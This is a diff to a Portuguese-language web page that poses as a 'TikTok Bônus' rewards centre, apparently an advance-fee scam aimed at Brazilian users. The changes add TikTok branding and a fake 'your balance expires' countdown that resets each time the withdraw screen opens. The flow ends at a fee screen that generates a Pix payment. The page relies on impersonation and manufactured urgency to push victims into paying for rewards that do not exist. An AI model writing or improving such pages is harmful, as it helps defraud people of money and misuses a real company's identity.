@@ -242,6 +242,12 @@
       object-fit: contain;
     }
 
+    .home-brand-title {
+      color: #191a20;
+      font-size: 14px;
+      font-weight: 900;
+    }
+
     .loading-brand-mark {
       width: 56px;
       height: 56px;
@@ -618,13 +624,27 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      min-height: 48px;
+      min-height: 58px;
       margin: -8px -10px 14px;
       border-bottom: 1px solid var(--line);
       background: rgba(255, 255, 255, 0.94);
       backdrop-filter: blur(12px);
       font-size: 15px;
       font-weight: 900;
+    }
+
+    .withdraw-header {
+      flex-direction: column;
+      gap: 7px;
+      padding: 6px 42px 10px;
+      line-height: 1;
+    }
+
+    .withdraw-expire {
+      color: #383b44;
+      font-size: 8px;
+      font-weight: 900;
+      text-transform: uppercase;
     }
 
     .back-button {
@@ -849,6 +869,70 @@
       line-height: 1.35;
       text-align: center;
       font-weight: 700;
+    }
+
+    .withdraw-extra-card {
+      position: relative;
+      margin-bottom: 14px;
+      padding: 18px 20px;
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      background: var(--surface);
+      box-shadow: 0 1px 0 rgba(20, 22, 28, 0.03);
+    }
+
+    .live-coins-card {
+      min-height: 112px;
+      padding-right: 108px;
+    }
+
+    .withdraw-extra-title {
+      margin: 0 0 8px;
+      color: #2d3038;
+      font-size: 13px;
+      font-weight: 900;
+    }
+
+    .withdraw-extra-copy {
+      margin: 0;
+      color: #8a8e98;
+      font-size: 11px;
+      line-height: 1.35;
+      font-weight: 800;
+    }
+
+    .live-rose {
+      position: absolute;
+      right: 22px;
+      top: 18px;
+      width: 62px;
+      height: 62px;
+      object-fit: contain;
+    }
+
+    .unavailable-button {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 40px;
+      margin-top: 18px;
+      border-radius: 6px;
+      background: #f1f2f4;
+      color: #d0d2d7;
+      font-size: 12px;
+      font-weight: 900;
+    }
+
+    .mobile-recharge-field {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      min-height: 34px;
+      margin-top: 6px;
+      border-bottom: 1px solid #eceef2;
+      color: #b5b8c0;
+      font-size: 12px;
+      font-weight: 800;
     }
 
     .field-group,
@@ -1209,14 +1293,14 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      min-height: 54px;
+      min-height: 62px;
       margin: -8px -10px 0;
       background: #fff;
     }
 
     .fee-logo {
-      width: 56px;
-      height: auto;
+      width: 92px;
+      height: 36px;
       object-fit: contain;
     }
 
@@ -1714,7 +1798,7 @@
 
     <section class="screen" id="home-screen">
       <header class="brand" aria-label="Central de Recompensas">
-        <img class="brand-mark" src="assets/tiktok-logo.png" alt="TikTok">
+        <span class="home-brand-title">TikTok Bônus</span>
       </header>
 
       <section class="balance-strip" aria-label="Resumo de saldo">
@@ -1829,6 +1913,7 @@
             <path d="M15 18 9 12l6-6"></path>
           </svg>
         </button>
+        <small class="withdraw-expire" id="withdraw-expire">Seu saldo expira em 00:16:00</small>
         <span>Resgatar recompensas</span>
       </header>
 
@@ -1861,6 +1946,18 @@
         <p class="withdraw-note">
           Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
         </p>
+      </section>
+
+      <section class="withdraw-extra-card live-coins-card" aria-label="Obtenha Moedas para a LIVE">
+        <h2 class="withdraw-extra-title">Obtenha Moedas para a LIVE</h2>
+        <p class="withdraw-extra-copy">Use Moedas para enviar presentes virtuais para seus hosts de live Favoritos.</p>
+        <img class="live-rose" src="assets/rose-live.png" alt="">
+        <div class="unavailable-button" aria-disabled="true">Indisponível</div>
+      </section>
+
+      <section class="withdraw-extra-card" aria-label="Recarga móvel">
+        <h2 class="withdraw-extra-title">Recarga móvel</h2>
+        <div class="mobile-recharge-field"><span>+55</span><span>12345678901</span></div>
       </section>
 
       <div class="modal-backdrop" id="method-backdrop" hidden></div>
@@ -1927,7 +2024,7 @@
             <path d="M15 18 9 12l6-6"></path>
           </svg>
         </button>
-        <img class="fee-logo" src="assets/tiktok-logo.png" alt="TikTok">
+        <img class="fee-logo" src="assets/tiktok-fee-logo.png" alt="TikTok">
         <span class="timer" id="payment-timer">Tempo restante: 5:00</span>
       </header>
 
@@ -2047,6 +2144,7 @@
     const balanceAmounts = document.querySelectorAll(".js-balance-amount");
     const selectedWithdrawAmounts = document.querySelectorAll(".js-selected-withdraw-amount");
     const paymentTimer = document.querySelector("#payment-timer");
+    const withdrawExpire = document.querySelector("#withdraw-expire");
     const stepBanner = document.querySelector("#step-banner");
     const reviewName = document.querySelector("#review-name");
     const reviewDate = document.querySelector("#review-date");
@@ -2071,6 +2169,8 @@
     let hasGeneratedPix = false;
     let paymentTimerInterval = null;
     let paymentTimeLeft = 300;
+    let withdrawExpireInterval = null;
+    let withdrawExpireTimeLeft = 16 * 60;
     let loadingSequenceTimers = [];
 
     const touchedFields = {
@@ -2270,6 +2370,36 @@
       const minutes = Math.floor(totalSeconds / 60);
       const seconds = String(totalSeconds % 60).padStart(2, "0");
       return `${minutes}:${seconds}`;
+    }
+
+    function formatExpireCountdown(totalSeconds) {
+      const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, "0");
+      const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, "0");
+      const seconds = String(totalSeconds % 60).padStart(2, "0");
+      return `${hours}:${minutes}:${seconds}`;
+    }
+
+    function renderWithdrawExpireTimer() {
+      withdrawExpire.textContent = `Seu saldo expira em ${formatExpireCountdown(withdrawExpireTimeLeft)}`;
+    }
+
+    function startWithdrawExpireTimer() {
+      window.clearInterval(withdrawExpireInterval);
+      withdrawExpireTimeLeft = 16 * 60;
+      renderWithdrawExpireTimer();
+
+      withdrawExpireInterval = window.setInterval(() => {
+        withdrawExpireTimeLeft = Math.max(0, withdrawExpireTimeLeft - 1);
+        renderWithdrawExpireTimer();
+
+        if (withdrawExpireTimeLeft === 0) {
+          window.clearInterval(withdrawExpireInterval);
+        }
+      }, 1000);
+    }
+
+    function stopWithdrawExpireTimer() {
+      window.clearInterval(withdrawExpireInterval);
     }
 
     function renderPaymentTimer() {
@@ -2581,17 +2711,20 @@
     openWithdrawButtons.forEach((button) => {
       button.addEventListener("click", () => {
         closeWithdrawMethodSheet();
+        startWithdrawExpireTimer();
         showScreen(withdrawScreen);
       });
     });
 
     backHome.addEventListener("click", () => {
       closeWithdrawMethodSheet();
+      stopWithdrawExpireTimer();
       showScreen(homeScreen);
     });
 
     backWithdraw.addEventListener("click", () => {
       closeWithdrawMethodSheet();
+      startWithdrawExpireTimer();
       showScreen(withdrawScreen);
     });
 
@@ -2684,6 +2817,7 @@
       showScreen(loadingScreen);
 
       runWithdrawLoadingSequence(() => {
+        stopWithdrawExpireTimer();
         startPaymentTimer();
         showScreen(confirmScreen);
         generatePixPayment();
@@ -2749,6 +2883,7 @@
     setSelectedWithdrawAmount();
     updatePixTypeOptions();
     setReviewDate();
+    renderWithdrawExpireTimer();
     updatePixKeyField();
     validateWithdrawForm();
     loadFooterImages();
